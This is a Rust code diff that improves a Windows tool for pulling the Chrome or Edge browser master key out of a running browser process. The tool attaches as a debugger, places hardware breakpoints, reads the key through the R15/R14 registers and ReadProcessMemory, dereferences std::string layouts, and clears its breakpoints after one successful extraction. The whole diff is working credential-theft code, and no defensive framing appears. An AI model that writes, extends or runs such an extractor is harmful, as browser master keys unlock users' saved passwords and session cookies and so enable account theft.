@@ -337,8 +337,12 @@ unsafe fn debug_loop(h_process: HANDLE) {
                     println!("Single step exception at 0x{:X}", exception.ExceptionRecord.ExceptionAddress as usize);
                     if exception.ExceptionRecord.ExceptionAddress as usize == target_address {
                         println!("Target breakpoint hit!");
-                        extract_key(debug_event.dwThreadId, h_process);
+                        if extract_key(debug_event.dwThreadId, h_process) {
+                            // Stop after one successful extraction
+                            clear_hardware_breakpoints(debug_event.dwProcessId);
+                        }
                     }
+                    set_resume_flag(debug_event.dwThreadId);
                 }
             }
             EXIT_PROCESS_DEBUG_EVENT => {
@@ -452,6 +456,44 @@ unsafe fn get_all_threads(process_id: u32) -> Vec<u32> {
     threads
 }
 
+unsafe fn set_resume_flag(thread_id: u32) {
+    let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
+    if h_thread == 0 {
+        return;
+    }
+
+    SuspendThread(h_thread);
+
+    let mut context: CONTEXT = zeroed();
+    context.ContextFlags = CONTEXT_CONTROL;
+    if GetThreadContext(h_thread, &mut context) != 0 {
+        context.EFlags |= 0x10000; // Set RF (Resume Flag)
+        SetThreadContext(h_thread, &context);
+    }
+
+    ResumeThread(h_thread);
+    CloseHandle(h_thread);
+}
+
+unsafe fn clear_hardware_breakpoints(process_id: u32) {
+    let threads = get_all_threads(process_id);
+    for thread_id in threads {
+        let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
+        if h_thread != 0 {
+            SuspendThread(h_thread);
+            let mut context: CONTEXT = zeroed();
+            context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+            if GetThreadContext(h_thread, &mut context) != 0 {
+                context.Dr0 = 0;
+                context.Dr7 &= !0b11; // Disable DR0
+                SetThreadContext(h_thread, &context);
+            }
+            ResumeThread(h_thread);
+            CloseHandle(h_thread);
+        }
+    }
+}
+
 unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
     let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
     if h_thread == 0 {
@@ -472,32 +514,50 @@ unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
     CloseHandle(h_thread);
 }
 
-unsafe fn extract_key(thread_id: u32, h_process: HANDLE) {
+unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
     let h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id);
     if h_thread == 0 {
-        return;
+        return false;
     }
 
+    let mut success = false;
     let mut context: CONTEXT = zeroed();
     context.ContextFlags = CONTEXT_FULL;
     if GetThreadContext(h_thread, &mut context) != 0 {
         // According to the article, R15 holds the key pointer for Chrome, R14 for Edge
-        let mut key_ptrs = vec![context.R15, context.R14];
+        let key_ptrs = vec![context.R15, context.R14];
         println!("Checking key pointers: R15=0x{:X}, R14=0x{:X}", context.R15, context.R14);
 
-        for &key_ptr in &key_ptrs {
-            if key_ptr == 0 { continue; }
-            let mut key = [0u8; 32]; // Masterkey is typically 32 bytes
+        for &ptr in &key_ptrs {
+            if ptr == 0 { continue; }
+            let mut buffer = [0u8; 32];
             let mut bytes_read = 0;
-            if ReadProcessMemory(h_process, key_ptr as *const _, key.as_mut_ptr() as *mut _, key.len(), &mut bytes_read) != 0 {
-                // Heuristic: masterkey is high entropy, shouldn't be all zeros
-                if key.iter().any(|&b| b != 0) {
-                    println!("Extracted Master Key from 0x{:X}: {:02X?}", key_ptr, key);
-                    break;
+            if ReadProcessMemory(h_process, ptr as *const _, buffer.as_mut_ptr() as *mut _, buffer.len(), &mut bytes_read) != 0 {
+                // Check if it's a std::string (length 32 at offset 8)
+                let mut data_ptr = ptr;
+                let mut is_std_string = false;
+
+                let length = u64::from_le_bytes(buffer[8..16].try_into().unwrap_or([0; 8]));
+                if length == 32 {
+                    is_std_string = true;
+                    data_ptr = u64::from_le_bytes(buffer[0..8].try_into().unwrap_or([0; 8]));
+                    println!("Detected std::string, actual data at 0x{:X}", data_ptr);
+                }
+
+                let mut key = [0u8; 32];
+                if ReadProcessMemory(h_process, data_ptr as *const _, key.as_mut_ptr() as *mut _, key.len(), &mut bytes_read) != 0 {
+                    if key.iter().any(|&b| b != 0) {
+                        // Basic entropy check: if it was a std::string on stack, the first 8 bytes of "key" would be the pointer again if we didn't dereference.
+                        // If we did dereference, it should be the actual master key.
+                        println!("Extracted Master Key from 0x{:X}: {:02X?}", data_ptr, key);
+                        success = true;
+                        break;
+                    }
                 }
             }
         }
     }
 
     CloseHandle(h_thread);
+    success
 }
